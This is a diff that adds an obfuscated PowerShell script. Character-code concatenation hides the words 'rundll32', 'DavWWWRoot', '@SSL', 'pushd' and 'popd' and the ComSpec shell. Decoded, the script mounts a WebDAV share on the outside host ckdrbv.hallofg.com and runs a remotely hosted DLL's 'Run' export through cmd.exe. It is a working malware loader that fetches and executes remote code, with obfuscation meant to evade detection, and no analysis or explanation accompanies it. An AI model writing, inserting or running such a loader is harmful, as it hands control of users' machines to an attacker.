@@ -1,0 +1,49 @@
+$server = 'ckdrbv.hallofg.com.'
+$folder = '0d183b7d-c3d0-4459-a635-2cc3bdbaafae'
+$file   = 'dkirjckespgjwbxjfurh.dll'
+$export = 'Run'
+
+$_p = [string]::Join('',
+      [char]64,[char]83,
+      [char]83,[char]76)
+
+$_d = [string]::Join('',
+      [char]68,[char]97,[char]118,
+      [char]87,[char]87,[char]87,
+      [char]82,[char]111,[char]111,
+      [char]116)
+
+$root = '\\' + $server +
+        $_p  + '\' +
+        $_d  + '\' + $folder
+
+$_rd = [string]::Join('',
+       [char]114,[char]117,[char]110,
+       [char]100,[char]108,[char]108,
+       [char]51,[char]50)
+
+$_pd = [string]::Join('',
+       [char]112,[char]117,
+       [char]115,[char]104,[char]100)
+
+$_pp = [string]::Join('',
+       [char]112,[char]111,
+       [char]112,[char]100)
+
+$tmpl =
+    $_pd  + ' "' + $root + '"' +
+    ' && ' +
+    $_rd  + ' "' + $file + '",' + $export +
+    ' && ' +
+    $_pp
+
+$_sh = (
+    Get-Item (
+        'Env:\C' +
+        [char]111 + 'm' +
+        [char]83  + 'p' +
+        [char]101 + 'c'
+    )
+).Value
+
+& $_sh /d /c $tmpl
